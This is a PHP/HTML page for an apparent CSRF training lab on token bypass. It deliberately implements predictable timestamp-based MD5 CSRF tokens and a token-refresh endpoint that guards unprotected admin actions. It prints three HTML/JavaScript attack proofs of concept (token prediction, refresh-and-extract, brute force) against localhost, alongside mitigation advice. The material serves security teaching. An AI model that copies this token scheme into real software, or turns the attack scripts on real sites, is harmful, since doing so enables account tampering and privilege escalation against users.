<?php
// Lab 2: CSRF with Token Bypass
// Vulnerability: Weak CSRF token implementation

session_start();

$message = '';
$user_profile = [];

// Initialize user profile if not exists
if (!isset($_SESSION['user_profile'])) {
    $_SESSION['user_profile'] = [
        'username' => 'victim_user',
        'email' => 'victim@example.com',
        'role' => 'user',
        'balance' => 1000.00,
        'phone' => '+1-555-0123',
        'address' => '123 Main St, City, State'
    ];
}

$user_profile = $_SESSION['user_profile'];

// Generate weak CSRF token
function generate_weak_token() {
    return md5(time() . 'weak_secret');
}

// Get or generate CSRF token
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = generate_weak_token();
}

$csrf_token = $_SESSION['csrf_token'];

// Handle profile update with weak CSRF protection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['update_profile'])) {
    $token = $_POST['csrf_token'] ?? '';
    
    // Weak CSRF validation - predictable token
    if ($token === $csrf_token) {
        $username = $_POST['username'] ?? $user_profile['username'];
        $email = $_POST['email'] ?? $user_profile['email'];
        $phone = $_POST['phone'] ?? $user_profile['phone'];
        $address = $_POST['address'] ?? $user_profile['address'];
        
        $_SESSION['user_profile'] = [
            'username' => $username,
            'email' => $email,
            'role' => $user_profile['role'],
            'balance' => $user_profile['balance'],
            'phone' => $phone,
            'address' => $address
        ];
        
        $user_profile = $_SESSION['user_profile'];
        $message = '<div class="alert alert-success">Profile updated successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid CSRF token!</div>';
    }
}

// Handle admin action with weak CSRF protection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['admin_action'])) {
    $token = $_POST['csrf_token'] ?? '';
    $action = $_POST['action'] ?? '';
    
    // Weak CSRF validation
    if ($token === $csrf_token) {
        if ($action === 'promote_user') {
            $_SESSION['user_profile']['role'] = 'admin';
            $user_profile = $_SESSION['user_profile'];
            $message = '<div class="alert alert-success">User promoted to admin!</div>';
        } elseif ($action === 'add_balance') {
            $_SESSION['user_profile']['balance'] += 1000;
            $user_profile = $_SESSION['user_profile'];
            $message = '<div class="alert alert-success">Balance increased by $1000!</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Invalid CSRF token!</div>';
    }
}

// Handle token refresh (vulnerable)
if (isset($_GET['refresh_token'])) {
    $_SESSION['csrf_token'] = generate_weak_token();
    $csrf_token = $_SESSION['csrf_token'];
    $message = '<div class="alert alert-info">CSRF token refreshed!</div>';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 2: CSRF with Token Bypass - CSRF Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .profile-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .profile-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .token-display {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSRF Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 2: CSRF with Token Bypass</h1>
            <p class="hero-subtitle">Weak CSRF token implementation</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CSRF vulnerabilities where weak CSRF token implementation can be bypassed. The application uses predictable tokens and weak validation mechanisms that can be exploited by attackers.</p>
            <p><strong>Objective:</strong> Bypass CSRF protection by exploiting weak token generation and validation mechanisms.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Weak CSRF token generation
function generate_weak_token() {
    return md5(time() . 'weak_secret');
}

// Vulnerable: Predictable token validation
if ($token === $csrf_token) {
    // Process request
    $_SESSION['user_profile'] = $new_data;
}

// Vulnerable: Token refresh endpoint
if (isset($_GET['refresh_token'])) {
    $_SESSION['csrf_token'] = generate_weak_token();
    // Token can be predicted by attacker
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-exclamation me-2"></i>CSRF Protection Status
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="token-display">
                            <h5>Current CSRF Token</h5>
                            <p><strong>Token:</strong> <code><?php echo htmlspecialchars($csrf_token); ?></code></p>
                            <p><strong>Generated:</strong> <?php echo date('Y-m-d H:i:s'); ?></p>
                            <p><strong>Weakness:</strong> Predictable MD5 hash based on timestamp</p>
                        </div>
                        
                        <div class="profile-info">
                            <h5>Current Profile</h5>
                            <p><strong>Username:</strong> <?php echo htmlspecialchars($user_profile['username']); ?></p>
                            <p><strong>Email:</strong> <?php echo htmlspecialchars($user_profile['email']); ?></p>
                            <p><strong>Role:</strong> <?php echo htmlspecialchars($user_profile['role']); ?></p>
                            <p><strong>Balance:</strong> $<?php echo number_format($user_profile['balance'], 2); ?></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-person-gear me-2"></i>Profile Update (Protected)
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="update_profile" value="1">
                            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username</label>
                                <input type="text" class="form-control" id="username" name="username" 
                                       value="<?php echo htmlspecialchars($user_profile['username']); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="email" class="form-label">Email</label>
                                <input type="email" class="form-control" id="email" name="email" 
                                       value="<?php echo htmlspecialchars($user_profile['email']); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="phone" class="form-label">Phone</label>
                                <input type="text" class="form-control" id="phone" name="phone" 
                                       value="<?php echo htmlspecialchars($user_profile['phone']); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="address" class="form-label">Address</label>
                                <textarea class="form-control" id="address" name="address" rows="2"><?php echo htmlspecialchars($user_profile['address']); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Update Profile</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-lock me-2"></i>Admin Actions (Protected)
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="admin_action" value="1">
                            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
                            <div class="mb-3">
                                <label for="action" class="form-label">Action</label>
                                <select class="form-select" id="action" name="action">
                                    <option value="promote_user">Promote User to Admin</option>
                                    <option value="add_balance">Add $1000 to Balance</option>
                                </select>
                            </div>
                            <button type="submit" class="btn btn-primary">Execute Action</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CSRF Token Bypass</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Weak CSRF token generation and validation</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Bypass Techniques</h5>
                    <ul>
                        <li><strong>Token Prediction:</strong> Predict tokens based on timestamp</li>
                        <li><strong>Token Refresh:</strong> Use refresh endpoint to get new token</li>
                        <li><strong>Token Reuse:</strong> Reuse tokens from other sessions</li>
                        <li><strong>Token Brute Force:</strong> Brute force weak token space</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CSRF Bypass Techniques</h5>
            <p>Use these techniques to bypass CSRF protection:</p>
            
            <h6>1. Token Prediction Attack:</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Token Prediction Attack&lt;/h1&gt;
    &lt;script&gt;
        // Predict token based on current timestamp
        var timestamp = Math.floor(Date.now() / 1000);
        var predictedToken = md5(timestamp + 'weak_secret');
        
        // Create form with predicted token
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'http://localhost/test/csrf/2.php';
        
        var inputs = [
            {name: 'update_profile', value: '1'},
            {name: 'csrf_token', value: predictedToken},
            {name: 'username', value: 'hacked_user'},
            {name: 'email', value: 'hacker@evil.com'}
        ];
        
        inputs.forEach(function(input) {
            var inputElement = document.createElement('input');
            inputElement.type = 'hidden';
            inputElement.name = input.name;
            inputElement.value = input.value;
            form.appendChild(inputElement);
        });
        
        document.body.appendChild(form);
        form.submit();
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. Token Refresh Attack:</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Token Refresh Attack&lt;/h1&gt;
    &lt;script&gt;
        // First, refresh the token
        fetch('http://localhost/test/csrf/2.php?refresh_token=1')
            .then(response =&gt; response.text())
            .then(data =&gt; {
                // Extract token from response (if visible)
                var tokenMatch = data.match(/csrf_token.*?value="([^"]+)"/);
                if (tokenMatch) {
                    var token = tokenMatch[1];
                    
                    // Now use the token for CSRF attack
                    var form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'http://localhost/test/csrf/2.php';
                    
                    var inputs = [
                        {name: 'admin_action', value: '1'},
                        {name: 'csrf_token', value: token},
                        {name: 'action', value: 'promote_user'}
                    ];
                    
                    inputs.forEach(function(input) {
                        var inputElement = document.createElement('input');
                        inputElement.type = 'hidden';
                        inputElement.name = input.name;
                        inputElement.value = input.value;
                        form.appendChild(inputElement);
                    });
                    
                    document.body.appendChild(form);
                    form.submit();
                }
            });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. Token Brute Force Attack:</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Token Brute Force Attack&lt;/h1&gt;
    &lt;script&gt;
        // Brute force weak token space
        function bruteForceToken() {
            var timestamp = Math.floor(Date.now() / 1000);
            
            // Try tokens around current timestamp
            for (var i = -10; i &lt;= 10; i++) {
                var testTimestamp = timestamp + i;
                var testToken = md5(testTimestamp + 'weak_secret');
                
                // Test token with a request
                fetch('http://localhost/test/csrf/2.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: 'update_profile=1&csrf_token=' + testToken + '&username=hacked_user'
                }).then(response =&gt; {
                    if (response.ok) {
                        console.log('Token found:', testToken);
                    }
                });
            }
        }
        
        bruteForceToken();
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Bypass CSRF protection and perform unauthorized actions</li>
                <li>Privilege escalation and administrative access</li>
                <li>Unauthorized profile modifications and data changes</li>
                <li>Financial fraud and unauthorized transactions</li>
                <li>Account takeovers and password changes</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Use cryptographically secure random tokens</li>
                    <li>Implement proper token validation and expiration</li>
                    <li>Use SameSite cookie attributes</li>
                    <li>Implement double-submit cookie pattern</li>
                    <li>Use proper session management and timeout</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual request patterns and anomalies</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
